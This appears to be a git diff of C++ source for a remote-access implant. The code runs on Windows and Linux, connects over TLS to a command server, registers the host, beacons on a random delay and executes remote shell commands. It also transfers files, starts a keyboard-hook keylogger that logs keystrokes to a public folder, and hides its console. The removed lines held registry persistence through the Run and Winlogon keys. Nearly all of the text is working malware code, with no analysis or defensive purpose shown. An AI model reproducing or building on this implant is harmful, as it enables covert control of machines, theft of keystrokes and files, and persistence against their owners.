@@ -8,6 +8,8 @@
 #include <sys/stat.h>
 #include <filesystem>
 
+#include <iostream>
+#include "./includes/cJSON/cJSON.h"
 #ifdef _WIN32
     #define SECURITY_WIN32
     #include <winsock2.h>
@@ -15,41 +17,26 @@
     #include <windows.h>
     #include <security.h>
     #include <schannel.h>
-    #include <fcntl.h>
-
-    #define file_path "z:\\tmp\\id"       //"\\windows\\Temp\\id" 
-    SOCKET sock = INVALID_SOCKET;
-    CredHandle hCred;
-    CtxtHandle hCtxt;
-    SecPkgContext_StreamSizes streamSizes;
+    #ifndef file_path
+    #define file_path "\\windows\\Temp\\id"  //"z:\\tmp\\id"    
+    #endif
+    #define SLEEP(seconds) Sleep((seconds) * 1000) 
 #else
     //#include <cjson/cJSON.h>
     #include <openssl/ssl.h>
     #include <openssl/err.h>
-
     #include <sys/utsname.h>
     #include <sys/ioctl.h>
     #include <net/if.h>
     #include <netinet/in.h>
     #include <arpa/inet.h>
     #include <netdb.h>
-    
-    #include <arpa/inet.h>
-    #include <netinet/in.h>
     #include <sys/socket.h>
+    #ifndef file_path
     #define file_path "/tmp/id"
-
-    int sock;
-    SSL_CTX *ctx;
-    SSL *ssl;
-
+    #endif
+    #define SLEEP(seconds) sleep(seconds)
 #endif
-
-#include "./includes/cJSON/cJSON.h"
-
-
-//#pragma comment(lib, "ws2_32.lib")
-//#pragma comment(lib, "Secur32.lib")
 
 using namespace std;
 
@@ -59,332 +46,84 @@ using namespace std;
 #define max_response 0x20000
 #define MAX_RESPONSE 0x20000
 #define FILE_CHUNK 0x256
-char ADDR[BUFFER_SIZE] = "192.168.2.2";
-int PORT = 7777;
 
-
-
-#ifdef _WIN32
-int schannel_recv(char *buffer, int buffer_len) {
-    char encrypted[4096];
-    SecBuffer secBuffers[4];
-    SecBufferDesc secBufferDesc;
-    SECURITY_STATUS status;
-
-    int bytesRead = recv(sock, encrypted, sizeof(encrypted), 0);
-    if (bytesRead <= 0) return -1;
-
-    secBuffers[0].BufferType = SECBUFFER_DATA;
-    secBuffers[0].pvBuffer = encrypted;
-    secBuffers[0].cbBuffer = bytesRead;
-    secBuffers[1].BufferType = SECBUFFER_EMPTY;
-    secBuffers[2].BufferType = SECBUFFER_EMPTY;
-    secBuffers[3].BufferType = SECBUFFER_EMPTY;
-
-    secBufferDesc.cBuffers = 4;
-    secBufferDesc.pBuffers = secBuffers;
-    secBufferDesc.ulVersion = SECBUFFER_VERSION;
-
-    status = DecryptMessage(&hCtxt, &secBufferDesc, 0, NULL);
-    if (status != SEC_E_OK) return -1;
-
-    for (int i = 0; i < 4; i++) {
-        if (secBuffers[i].BufferType == SECBUFFER_DATA) {
-            //memcpy(buffer, secBuffers[i].pvBuffer, min((size_t)buffer_len, secBuffers[i].cbBuffer));
-            // Change the min() call to explicitly cast both arguments to size_t
-            memcpy(buffer, secBuffers[i].pvBuffer, min(static_cast<size_t>(buffer_len), static_cast<size_t>(secBuffers[i].cbBuffer)));
-            return secBuffers[i].cbBuffer;
-        }
-    }
-
-    return -1;
-}
-
-int schannel_send(const char *data, int len) {
-    char *message = (char*)malloc(streamSizes.cbHeader + len + streamSizes.cbTrailer);
-    if (!message) return -1;
-
-    SecBuffer buffers[3];
-    SecBufferDesc desc;
-
-    memcpy(message + streamSizes.cbHeader, data, len);
-
-    buffers[0].pvBuffer = message;
-    buffers[0].cbBuffer = streamSizes.cbHeader;
-    buffers[0].BufferType = SECBUFFER_STREAM_HEADER;
-
-    buffers[1].pvBuffer = message + streamSizes.cbHeader;
-    buffers[1].cbBuffer = len;
-    buffers[1].BufferType = SECBUFFER_DATA;
-
-    buffers[2].pvBuffer = message + streamSizes.cbHeader + len;
-    buffers[2].cbBuffer = streamSizes.cbTrailer;
-    buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;
-
-    desc.cBuffers = 3;
-    desc.pBuffers = buffers;
-    desc.ulVersion = SECBUFFER_VERSION;
-
-    SECURITY_STATUS status = EncryptMessage(&hCtxt, 0, &desc, 0);
-    if (status != SEC_E_OK) {
-        free(message);
-        return -1;
-    }
-
-    int totalSize = buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer;
-    int sent = send(sock, message, totalSize, 0);
-    free(message);
-
-    return sent;
-}
+#ifndef ADDR
+#define ADDR "127.0.0.1"
 #endif
 
-class Device {
-    public:
-    void hideConsole();
-    const char* get_Arch();
-};
+#ifndef PORT
+#define PORT 7777
+#endif
 
-class Communicate_ {
-    private:
-    public:
-    int conn();
-    void reg(Device d);
-    void beacon(const char *id);
-    void session();
-    int upload(const char* path);
-    int download(const char* path);
-};
-
+// prototypes
 class Keylogger {
     public:
     #ifdef _WIN32
-        inline static  char keyloggerfile[256] = "C:\\Users\\Public\\log.txt";
-        static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-            int keyCount = 0;
-            if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
-                DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
-                FILE* file;
-                fopen_s(&file, keyloggerfile, "a");
-                if (file != NULL) {
-                    fprintf(file, "%lu", vkCode);
-                    fclose(file);
-                }
-                keyCount++;
-                }
-                return CallNextHookEx(NULL, nCode, wParam, lParam);
-            }
-        
-            DWORD WINAPI StartWindowsKeylogger(LPVOID arg) {
-                HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
-                // wait for events
-                MSG msg;
-                while (GetMessage(&msg, NULL, 0, 0) > 0) {
-                    TranslateMessage(&msg);
-                    DispatchMessage(&msg);
-                }
-                // delete hook
-                UnhookWindowsHookEx(hook);
-                return 0;
-            }
-        
+    inline static  char keyloggerfile[256] = "C:\\Users\\Public\\log.txt";
+    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+    static DWORD WINAPI StartWindowsKeylogger(LPVOID arg);
     #else
+
     #endif
 };
 
-#ifdef _WIN32
-class WindowsPersistence {
-    
-    private:
-    string exePath;
+
+class GetDeviceInfo {
     public:
-    // Constructor
-    WindowsPersistence(string exePath) {
-        this->exePath = exePath;
-    }
-    // Getters
-    string getExePath() {
-        return this->exePath;
-    }
-    // Setters
-    void setExePath(string exePath) {
-        this->exePath = exePath;
-    }
-    // Persistence Methods
-    // Register Run
-    bool persistenceByRunReg(){
-        HKEY hkey = NULL;
-        LONG res = RegOpenKeyEx(HKEY_CURRENT_USER,(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
-    if (res == ERROR_SUCCESS) {
-        RegSetValueEx(hkey,(LPCSTR)"salsa", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
-    if (RegCloseKey(hkey) == ERROR_SUCCESS) {
-        return true;
-    }
-        RegCloseKey(hkey);
-    }
-    return false;
-    }
-    // Register Winlogon
-    bool persistenceByWinlogon(){
-        HKEY hkey = NULL;
-        LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
-    if (res == ERROR_SUCCESS) {
-        RegSetValueEx(hkey,(LPCSTR)"Shell", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
-    if (RegCloseKey(hkey) == ERROR_SUCCESS) {
-        return true;
-    }
-        RegCloseKey(hkey);
-    }
-    return false;
-    }
-    // Persistence by Winlogon
-    bool persistenceByWinlogonReg(){
-        HKEY hkey = NULL;
-        LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
-        if (res == ERROR_SUCCESS) {
-            RegSetValueEx(hkey,(LPCSTR)"Userinit", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
-        if (RegCloseKey(hkey) == ERROR_SUCCESS) {
-            return true;
-        }
-        RegCloseKey(hkey);
-        }
-        return false;
-    }
+    const char* get_arch();
 };
-#endif
 
-
-
-
-#ifdef _WIN32
-void Device::hideConsole() {
-    HWND stealth;
-    AllocConsole();
-    stealth = FindWindowA("ConsoleWindowClass", NULL);
-    ShowWindow(stealth, 0);
-}
-#endif
-
-
-const char* Device::get_Arch() {
+class Communicate {
+    private:
     #ifdef _WIN32
-        SYSTEM_INFO sysInfo;
-        GetNativeSystemInfo(&sysInfo);
-        switch (sysInfo.wProcessorArchitecture) {
-            case PROCESSOR_ARCHITECTURE_AMD64: return "x64"; break;
-            case PROCESSOR_ARCHITECTURE_INTEL: return  "x86"; break;
-            case PROCESSOR_ARCHITECTURE_ARM64: return  "ARM64"; break;
-            default: return "unknown"; break;
-        }
+        SOCKET sock = INVALID_SOCKET;
+        CredHandle hCred;
+        CtxtHandle hCtxt;
+        SecPkgContext_StreamSizes streamSizes;
     #else
-        char *arch = (char*)malloc(0x32);
-        struct utsname buffer;
-        if (uname(&buffer) == 0) {
-            snprintf(arch, 0x32, "%s", buffer.machine);
-            return arch; 
-        } else {
-            return "Error getting architecture.\n";
-        }
+        int sock;
+        SSL_CTX *ctx;
+        SSL *ssl;
     #endif
-}
+    public:
+    Communicate();
+    int RECV(char *buffer, int buffer_len);
+    int SEND(const char *buffer, int buffer_len);
+    int file_upload(const char* path);
+    int file_download(const char* path);
+    int register_implant();
+    int beacon_implant();
+};
 
-
-int jitter() {
-    srand(time(0));  // Seed the random number generator
-
-    // Define the range (3 hours to 1 days in seconds)
-    const int MIN_SECONDS = 0xfff;  //1 * 3600;   // 1 hours (1 * 60 * 60)
-    const int MAX_SECONDS = 0xffff;  //3 * 3600;  // 3 hours (3 * 60 * 60)
-
-    return MIN_SECONDS + rand() % (MAX_SECONDS - MIN_SECONDS + 1);
-    
-}
-
+int jitter();
 
 int main() {
-    Communicate_ comm;
-    Device d;
-    
     #ifdef _WIN32
-        char path[0x100];
-        GetModuleFileNameA(NULL, path, 0x100);
-
-        WindowsPersistence p = WindowsPersistence(path);
-        
-        if (p.persistenceByRunReg()) {
-            goto START;
-        } else if (p.persistenceByWinlogon()) {
-            goto START;
-        } else if (p. persistenceByWinlogonReg()) {
-            goto START;
-        }
-
+    HWND stealth;
+    AllocConsole();
+    stealth = FindWindowA("consoleWindowClass", NULL);
+    ShowWindow(stealth, 0);
     #endif
-    // persistance
+
+    Communicate com;
     
-    START:
 
-    #ifdef _WIN32
-    d.hideConsole();
-    #endif
     while (1) {
-        if (comm.conn() == -1) {
-            sleep(jitter()); // use random for 
-            continue;
-        }
-        /*
-        #ifdef _WIN32
-        int file = open(file_path, OFN_READONLY);
-        #else
-        int file = open(file_path, O_RDONLY);
-        #endif
-        */
-        //int file = open(file_path, O_RDONLY);
         FILE *fp = fopen(file_path, "r");
         if (!fp) {
-            //register
-            comm.reg(d);
-            #ifdef _WIN32
-                Sleep(jitter());
-            #else
-                sleep(jitter());
-            #endif
-            continue;
+            if (com.register_implant() != 0) {
+                SLEEP(jitter());
+                 continue;
+            }
         }
-
-        char id[BUFFER_SIZE];
-
-        // read up to BUFFER_SIZE-1 chars, ensure null termination
-        if (fgets(id, sizeof(id), fp) != NULL) {
-            // strip newline if present
-            id[strcspn(id, "\r\n")] = '\0';
-            //printf("Beaconing with ID: %s", id);
-            //std::cout << Bea
-            comm.beacon(id);
-        } else {
-            // read failed → re-register
-            comm.reg(d);
-        }
-
-fclose(fp);
-
-        #ifdef _WIN32
-            // no cleanup
-            Sleep(jitter());
-        #else
-            SSL_shutdown(ssl);
-            SSL_free(ssl);
-            close(sock);
-            SSL_CTX_free(ctx);
-            EVP_cleanup();
-            sleep(jitter());
-        #endif
+        com.beacon_implant();
     }
     return 0;
 }
 
-int Communicate_::conn() {
-        #ifdef _WIN32
+Communicate::Communicate() {
+    #ifdef _WIN32
+        START_WINDOWS_CONNECTION:
         WSADATA wsaData;
         struct sockaddr_in serverAddress;
         SECURITY_STATUS ss;
@@ -394,12 +133,16 @@ int Communicate_::conn() {
         DWORD OutFlags;
         TimeStamp tsExpiry;
 
-        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return -1;
+        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+            SLEEP(jitter());
+            goto START_WINDOWS_CONNECTION;
+        }
 
         sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (sock == INVALID_SOCKET) {
             WSACleanup();
-            return -1;
+            SLEEP(jitter());
+            goto START_WINDOWS_CONNECTION;
         }
 
         serverAddress.sin_family = AF_INET;
@@ -408,7 +151,7 @@ int Communicate_::conn() {
 
         start_connect:
         if (connect(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
-            Sleep(30);
+            SLEEP(jitter());
             goto start_connect;
         }
 
@@ -420,7 +163,8 @@ int Communicate_::conn() {
         if (ss != SEC_E_OK) {
             closesocket(sock);
             WSACleanup();
-            return -1;
+            SLEEP(jitter());
+            goto START_WINDOWS_CONNECTION;
         }
 
         OutBufferDesc.cBuffers = 1;
@@ -435,7 +179,8 @@ int Communicate_::conn() {
             FreeCredentialsHandle(&hCred);
             closesocket(sock);
             WSACleanup();
-            return -1;
+            SLEEP(jitter());
+            goto START_WINDOWS_CONNECTION;
         }
 
         if (OutBufferDesc.cBuffers > 0 && OutBuffers[0].cbBuffer > 0) {
@@ -450,7 +195,10 @@ int Communicate_::conn() {
             InBuffer[0].BufferType = SECBUFFER_TOKEN;
             InBuffer[0].cbBuffer = 4096;
             InBuffer[0].pvBuffer = malloc(4096);
-            if (!InBuffer[0].pvBuffer) return -1;
+            if (!InBuffer[0].pvBuffer) {
+                SLEEP(jitter());
+                goto START_WINDOWS_CONNECTION;
+            }
 
             int bytesRead = recv(sock, (char *)InBuffer[0].pvBuffer, 4096, 0);
             if (bytesRead <= 0) {
@@ -459,7 +207,8 @@ int Communicate_::conn() {
                 FreeCredentialsHandle(&hCred);
                 closesocket(sock);
                 WSACleanup();
-                return -1;
+                SLEEP(jitter());
+                goto START_WINDOWS_CONNECTION;
             }
             InBuffer[0].cbBuffer = bytesRead;
 
@@ -490,13 +239,14 @@ int Communicate_::conn() {
             FreeCredentialsHandle(&hCred);
             closesocket(sock);
             WSACleanup();
-            return -1;
+            SLEEP(jitter());
+            goto START_WINDOWS_CONNECTION;
         }
 
 
         QueryContextAttributes(&hCtxt, SECPKG_ATTR_STREAM_SIZES, &streamSizes);
-        return 0;
-    #else
+        #else
+        START_LINUX_CONNECTION:
         struct sockaddr_in server_addr;
         struct hostent *server;
 
@@ -508,20 +258,23 @@ int Communicate_::conn() {
         // 2. Create SSL context (TLS client)
         ctx = SSL_CTX_new(TLS_client_method());
         if (!ctx) {
-            return -1;
+            SLEEP(jitter());
+            goto START_LINUX_CONNECTION;
         }
 
         // 3. Create TCP socket
         if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
             SSL_CTX_free(ctx);
-            return -1;
+            SLEEP(jitter());
+            goto START_LINUX_CONNECTION;
         }
 
         server = gethostbyname(ADDR);
         if (!server) {
             close(sock);
             SSL_CTX_free(ctx);
-            return -1;
+            SLEEP(jitter());
+            goto START_LINUX_CONNECTION;
         }
 
         memset(&server_addr, 0, sizeof(server_addr));
@@ -533,7 +286,8 @@ int Communicate_::conn() {
         if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
             close(sock);
             SSL_CTX_free(ctx);
-            return -1;
+            sleep(jitter());
+            goto START_LINUX_CONNECTION;
         }
 
         // 5. Create SSL object and bind to socket
@@ -545,72 +299,245 @@ int Communicate_::conn() {
             SSL_free(ssl);
             close(sock);
             SSL_CTX_free(ctx);
-            return -1;
+            sleep(jitter());
+            goto START_LINUX_CONNECTION;
         }
-        return 0;
+        #endif
+}
+
+#ifdef _WIN32
+int Communicate::SEND(const char *buffer, int buffer_len) {
+    char *message = (char*)malloc(streamSizes.cbHeader + buffer_len + streamSizes.cbTrailer);
+    if (!message) return -1;
+
+    SecBuffer buffers[3];
+    SecBufferDesc desc;
+
+    memcpy(message + streamSizes.cbHeader, buffer, buffer_len);
+
+    buffers[0].pvBuffer = message;
+    buffers[0].cbBuffer = streamSizes.cbHeader;
+    buffers[0].BufferType = SECBUFFER_STREAM_HEADER;
+
+    buffers[1].pvBuffer = message + streamSizes.cbHeader;
+    buffers[1].cbBuffer = buffer_len;
+    buffers[1].BufferType = SECBUFFER_DATA;
+
+    buffers[2].pvBuffer = message + streamSizes.cbHeader + buffer_len;
+    buffers[2].cbBuffer = streamSizes.cbTrailer;
+    buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;
+
+    desc.cBuffers = 3;
+    desc.pBuffers = buffers;
+    desc.ulVersion = SECBUFFER_VERSION;
+
+    SECURITY_STATUS status = EncryptMessage(&hCtxt, 0, &desc, 0);
+    if (status != SEC_E_OK) {
+        free(message);
+        return -1;
+    }
+
+    int totalSize = buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer;
+    int sent = send(sock, message, totalSize, 0);
+    free(message);
+
+    return sent;
+}
+
+int Communicate::RECV(char *buffer, int buffer_len) {
+    char encrypted[4096];
+    SecBuffer secBuffers[4];
+    SecBufferDesc secBufferDesc;
+    SECURITY_STATUS status;
+
+    int bytesRead = recv(sock, encrypted, sizeof(encrypted), 0);
+    if (bytesRead <= 0) return -1;
+
+    secBuffers[0].BufferType = SECBUFFER_DATA;
+    secBuffers[0].pvBuffer = encrypted;
+    secBuffers[0].cbBuffer = bytesRead;
+    secBuffers[1].BufferType = SECBUFFER_EMPTY;
+    secBuffers[2].BufferType = SECBUFFER_EMPTY;
+    secBuffers[3].BufferType = SECBUFFER_EMPTY;
+
+    secBufferDesc.cBuffers = 4;
+    secBufferDesc.pBuffers = secBuffers;
+    secBufferDesc.ulVersion = SECBUFFER_VERSION;
+
+    status = DecryptMessage(&hCtxt, &secBufferDesc, 0, NULL);
+    if (status != SEC_E_OK) return -1;
+
+    for (int i = 0; i < 4; i++) {
+        if (secBuffers[i].BufferType == SECBUFFER_DATA) {
+            memcpy(buffer, secBuffers[i].pvBuffer, min(static_cast<size_t>(buffer_len), static_cast<size_t>(secBuffers[i].cbBuffer)));
+            return secBuffers[i].cbBuffer;
+        }
+    }
+    return -1;
+}
+#else
+int Communicate::SEND(const char *buffer, int buffer_len) {
+    int sent = SSL_write(ssl, buffer, buffer_len);
+    if (sent <= 0) {
+        int err = SSL_get_error(ssl, sent);
+        return -1;
+    }
+    return sent;
+
+}
+
+int Communicate::RECV(char *buffer, int buffer_len) {
+    int received = SSL_read(ssl, buffer, buffer_len);
+    if (received <= 0) {
+        int err = SSL_get_error(ssl, received);
+        return -1;
+    }
+    return received;
+}
+#endif
+
+
+
+int Communicate::register_implant() {
+    GetDeviceInfo device;
+    char hostname[BUFFER_SIZE];
+    char os[BUFFER_SIZE];
+    if (gethostname(hostname, sizeof(hostname)) != 0) snprintf(hostname, sizeof(hostname), "Unknown");
+    const char *arch = device.get_arch(); 
+    #ifdef _WIN32
+    snprintf(os,sizeof(os), "%s", "windows");
+    #else
+    snprintf(os,sizeof(os), "%s", "linux");
     #endif
+
+    cJSON *reg = cJSON_CreateObject();
+    if (!reg) return -1;
+
+    cJSON_AddStringToObject(reg, "mode", "register");
+    cJSON_AddStringToObject(reg, "os", os);
+    cJSON_AddStringToObject(reg, "hostname", hostname);
+    cJSON_AddStringToObject(reg, "arch", arch);
+    char *data = cJSON_Print(reg);
+
+    if (SEND(data, strlen(data)) ==  -1) {
+        return -1;
+    }
+
+    free(data);
+    cJSON_Delete(reg);
+
+    char buffer[BUFFER_SIZE];
+    if (RECV(buffer, sizeof(buffer)) == -1) {
+        // handle this
+        return -1;
+    }
+
+    cJSON *reply = cJSON_Parse(buffer);
+    if (!reply) return -1;
+
+    cJSON *id = cJSON_GetObjectItem(reply, "implant_id");
+
+    FILE *f = fopen(file_path, "w");
+    if (!f) {
+        return -1;
+    }
+
+    fprintf(f, "%s", id->valuestring);
+    //fwrite(id->valuestring, 1, sizeof(id->valuestring), f);
+    fclose(f);
+    cJSON_Delete(reply);
+    return 0;
 }
 
 
+int Communicate::beacon_implant() {
+    cJSON *beacon = cJSON_CreateObject();
+    if (!beacon) {
+        return -1;
+    }
 
-void Communicate_::beacon(const char *id) {
-    FILE *exec;
-    cJSON *re = cJSON_CreateObject();
-    char result[MAX_RESPONSE];
-    char command_with_redirect[BUFFER_SIZE + 10];
-
-    cJSON *bea = cJSON_CreateObject();
-    cJSON_AddStringToObject(bea, "mode", "beacon");
-    cJSON_AddStringToObject(bea, "implant_id", id);
-    char *data = cJSON_Print(bea);
-    //send(sock, data, strlen(data), 0);
-    #ifdef _WIN32
-        schannel_send(data, strlen(data));
-    #else
-        SSL_write(ssl, data, strlen(data));
-    #endif
+    FILE *fp = fopen(file_path, "r");
+    if (!fp) return -1;
+    char id[9];
+    if (fgets(id, sizeof(id), fp) != NULL) {
+        id[strcspn(id, "\r\n")] = '\0';
+    } else {
+        return -1;
+    }
     
+    cJSON_AddStringToObject(beacon, "mode", "beacon");
+    cJSON_AddStringToObject(beacon, "implant_id", id);
+    char *data = cJSON_Print(beacon);
+    if (SEND(data, strlen(data)) == -1) {
+        cJSON_Delete(beacon);
+        free(data);
+        return -1;
+    }
+
     free(data);
-    cJSON_Delete(bea);
+    cJSON_Delete(beacon);
 
     char buffer[BUFFER_SIZE];
-    #ifdef _WIN32
-        if (schannel_recv(buffer, sizeof(buffer)) == -1) return;
-    #else
-        if (SSL_read(ssl, buffer, sizeof(buffer) -1) <= 0) {
-            return;
-        }
-    #endif
+    if (RECV(buffer, sizeof(buffer)) == -1) return -1;
 
+    cJSON *command = cJSON_Parse(buffer);
+    cJSON *mode = cJSON_GetObjectItem(command, "mode");
+    if (strcmp(mode->valuestring, "none") == 0) {
+        cJSON_Delete(command);    
+        return 0;
+    }
 
-    cJSON *reply = cJSON_Parse(buffer);
-    cJSON *mode = cJSON_GetObjectItem(reply, "mode");
-    if (strncmp(mode->valuestring, "none", 4) == 0) {
-        return;
-    }  
-
-    cJSON *task_id = cJSON_GetObjectItem(reply, "task_id");
-    cJSON *cmd = cJSON_GetObjectItem(reply, "command");
-    // if command = "upload [file path]" | upload file to agent
+    cJSON *cmd = cJSON_GetObjectItem(command, "command");
+    cJSON *task_id = cJSON_GetObjectItem(command, "task_id");
     
+    char result[MAX_RESPONSE];
+    char command_with_redirect[BUFFER_SIZE + 256];
+
+    cJSON *reply = cJSON_CreateObject();
     if (strncmp(cmd->valuestring, "upload", 6) == 0) {
         char path[BUFFER_SIZE];
         sscanf(cmd->valuestring, "upload %s", path);
-        upload(path);
-    // if command = "download [file path]" | download file from agent
+        file_upload(path);
+        strcpy(result, "File Download Successfully");
+        cJSON_AddStringToObject(reply, "mode", "result");
+        cJSON_AddStringToObject(reply, "implant_id", id);
+        cJSON_AddNumberToObject(reply, "task_id", task_id->valueint);
+        cJSON_AddStringToObject(reply, "response", result);
+        char *result_ = cJSON_Print(reply );
+        if (SEND(result_, strlen(result_)) == -1) {
+            cJSON_Delete(reply);
+            free(result_);
+
+            return -1;
+        }   
+        cJSON_Delete(reply);
+        free(result_);
+        return 0;
     } else if (strncmp(cmd->valuestring, "download", 8) == 0) { 
         char path[BUFFER_SIZE];
         sscanf(cmd->valuestring, "downlaod %s", path);
-        download(path);
+        file_download(path);
+        strcpy(result, "File Uploaded Successfully");
+        cJSON_AddStringToObject(reply, "mode", "result");
+        cJSON_AddStringToObject(reply, "implant_id", id);
+        cJSON_AddNumberToObject(reply, "task_id", task_id->valueint);
+        cJSON_AddStringToObject(reply, "response", result);
+        char *result_ = cJSON_Print(reply );
+        if (SEND(result_, strlen(result_)) == -1) {
+            cJSON_Delete(reply);
+            free(result_);
+
+            return -1;
+        }   
+        cJSON_Delete(reply);
+        free(result_);
+        return 0;
     } else if (strncmp(cmd->valuestring, "keylogger", 9) == 0) {
         #ifdef _WIN32
             HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger::StartWindowsKeylogger, NULL, 0, NULL);
             WaitForSingleObject(hThread, INFINITE);
             CloseHandle(hThread);
             strcpy(result, "Started Windows keylogger successfully");
-            //HANDLE hThread = CreateThread(NULL, 0,
-            //    (LPTHREAD_START_ROUTINE)StartWindowsKeylogger,
-            //    NULL, 0, NULL);
         #else
             pthread_t KeyloggerThread; 
             //pthread_create(&KeyloggerThread, NULL, StartLinuxKeylogger, NULL);
@@ -618,26 +545,25 @@ void Communicate_::beacon(const char *id) {
             strcpy(result, "Started Linux keylogger successfully");
         #endif
 
-        cJSON_AddStringToObject(re, "mode", "result");
-        cJSON_AddStringToObject(re, "implant_id", id);
-        cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
-        cJSON_AddStringToObject(re, "response", result);
-        char *result_ = cJSON_Print(re);
-
-        #ifdef _WIN32
-            if (schannel_send(result_, strlen(result_)) == -1) return;
-        #else
-            SSL_write(ssl, result_, strlen(result_));
-        #endif
-
-        cJSON_Delete(re);
+        cJSON_AddStringToObject(reply, "mode", "result");
+        cJSON_AddStringToObject(reply, "implant_id", id);
+        cJSON_AddNumberToObject(reply, "task_id", task_id->valueint);
+        cJSON_AddStringToObject(reply, "response", result);
+        char *result_ = cJSON_Print(reply );
+        if (SEND(result_, strlen(result_)) == -1) {
+            cJSON_Delete(reply);
+            free(result_);
+            return -1;
+        }
+        cJSON_Delete(reply);
         free(result_);
-        return;
+        return 0;
     }
 
     memset(buffer, 0, sizeof(buffer));
     snprintf(command_with_redirect, sizeof(command_with_redirect), "%s 2>&1", cmd->valuestring);
 
+    FILE *exec;
     #ifdef _WIN32
     exec = _popen(command_with_redirect, "r");
     #else
@@ -654,287 +580,98 @@ void Communicate_::beacon(const char *id) {
     }
     // send result
     SEND_RESULT:
-    cJSON_AddStringToObject(re, "mode", "result");
-    cJSON_AddStringToObject(re, "implant_id", id);
-    cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
-    cJSON_AddStringToObject(re, "response", result);
-    char *result_ = cJSON_Print(re);
+    cJSON_AddStringToObject(reply, "mode", "result");
+    cJSON_AddStringToObject(reply, "implant_id", id);
+    cJSON_AddNumberToObject(reply, "task_id", task_id->valueint);
+    cJSON_AddStringToObject(reply, "response", result);
+    char *result_ = cJSON_Print(reply);
 
-    #ifdef _WIN32
-        if (schannel_send(result_, strlen(result_)) == -1) return;
-    #else
-        SSL_write(ssl, result_, strlen(result_));
-    #endif
+    if (SEND(result_, strlen(result)) == -1) {
+        fclose(exec);
+        cJSON_Delete(reply);
+        free(result_);
+        return -1;
+    }
+
 
     fclose(exec);
-    cJSON_Delete(re);
-    free(result_);
-}
-
-void Communicate_::reg(Device d) {
-    char hostname[BUFFER_SIZE];
-    char os[BUFFER_SIZE];
-
-    if (gethostname(hostname, sizeof(hostname)) != 0) snprintf(hostname, sizeof(hostname), "Unknown");
-    const char *arch = d.get_Arch(); 
-    #ifdef _WIN32
-    snprintf(os,sizeof(os), "%s", "windows");
-    #else
-    snprintf(os,sizeof(os), "%s", "linux");
-    #endif
-    cJSON *reg = cJSON_CreateObject();
-    cJSON_AddStringToObject(reg, "mode", "register");
-    cJSON_AddStringToObject(reg, "os", os);
-    cJSON_AddStringToObject(reg, "hostname", hostname);
-    cJSON_AddStringToObject(reg, "arch", arch);
-    char *data = cJSON_Print(reg);
-    //send(sock, data, strlen(data), 0);
-    #ifdef _WIN32
-        if (schannel_send(data, strlen(data)) == -1) return;
-    #else
-        SSL_write(ssl, data, strlen(data));
-    #endif
-   
-    free(data);
-    cJSON_Delete(reg);
-
-    char buffer[BUFFER_SIZE];
-
-    #ifdef _WIN32
-        if (schannel_recv(buffer, sizeof(buffer)) == -1) return;
-    #else
-        if (SSL_read(ssl, buffer, sizeof(buffer) -1) <= 0 ) return;
-    #endif
-    
-    cJSON *reply = cJSON_Parse(buffer);
-    cJSON *id = cJSON_GetObjectItem(reply, "implant_id");
-
-    FILE *f = fopen(file_path, "w");
-    if (!f) {
-        return;
-    }
-
-    fprintf(f, "%s", id->valuestring);
-    //fwrite(id->valuestring, 1, sizeof(id->valuestring), f);
-    fclose(f);
     cJSON_Delete(reply);
+    free(result_);
+    return 0;
 }
 
 
-// download file to implant
-int Communicate_::download(const char* path) {
-    char *contents = (char*)malloc(MAX_RESPONSE);
-    cJSON *fileO = cJSON_CreateObject();
-    
-    if (access(path, F_OK) != 0) {
-        if (contents) free(contents);
-        if (fileO) cJSON_Delete(fileO);
-        return -1;
-    }
-    
-    int file = open(path, O_RDONLY);
-    if (file == -1) {
-        if (contents) free(contents);
-        if (fileO) cJSON_Delete(fileO);
-        return -1;
-    }
-    
-    if (contents == NULL) {
-        close(file);
-        if (fileO) cJSON_Delete(fileO);
-        return -1;
-    }
-    
-    if (!fileO) {
-        close(file);
-        free(contents);
-        return -1;
-    }
-
-    std::filesystem::path p(path);
-    std::string filename_str = p.filename().string();
-    const char* filename = filename_str.c_str();
-
-    cJSON_AddStringToObject(fileO, "file_name", filename);
-    char *Sfilename = cJSON_Print(fileO);
-    cJSON_Delete(fileO);
-    
-    if (!Sfilename) {
-        close(file);
-        free(contents);
-        return -1;
-    }
-
-    // send filename
-    #ifdef _WIN32
-        schannel_send(Sfilename, (int)strlen(Sfilename));
-    #else   
-        SSL_write(ssl, Sfilename, (int)strlen(Sfilename));
-    #endif
-
-    free(Sfilename);
-
-    // Get file size and send it in network byte order
-    struct stat st;
-    if (fstat(file, &st) == -1) {
-        close(file);
-        free(contents);
-        return -1;
-    }
-    
-    uint64_t filesize = st.st_size;
-    uint64_t network_filesize = htonll(filesize);
-    
